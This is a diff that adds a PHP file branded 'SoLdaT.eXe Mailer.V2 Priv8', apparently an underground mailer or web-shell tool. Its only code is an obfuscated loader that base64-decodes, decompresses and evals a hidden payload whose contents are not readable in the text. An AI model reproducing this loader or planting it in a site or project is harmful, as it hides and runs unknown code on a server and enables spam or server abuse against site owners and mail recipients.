@@ -1,0 +1,2 @@
+<?php //     SoLdaT.eXe Mailer.V2 Priv8  Only For My Freinds  Ok!    Fuck All  L4M3RZ        .
+$OOO0O0O00=__FILE__;$O00O00O00=__LINE__;$OO00O0000=4140;eval(gzuncompress(base64_decode('eNplj1mPgjAAhP8MSduIsSCihPDgfVvv62XDUQ5FwJZD+fWr2c1uNpuZp8nMl4xAMMbkJWy4cUIjKBBCvgIRMAsgvfCDkMJqVSDv4tvI9WjKofAzFSUsK0j/FytYU5H+In4vDa/MIju+JYxyDi2TU1X5cKgdOxTylKUMuoyazh+EJiMR3OrN0I2swUr1yXBmKs9dnD9YT9tXakG6nGan5NiZzK/UPjj99mI0xtKl4HLD227u53W3VRpABO1Ot9cfDEfjyXQ2X5Dlar3Z7vaH4+lsWrZDXc8PLtfwFsXJnfE0y4vHs8SSXFcaarOlVWoAIaTT3Azh7yGkfwLM418j')));return;?>
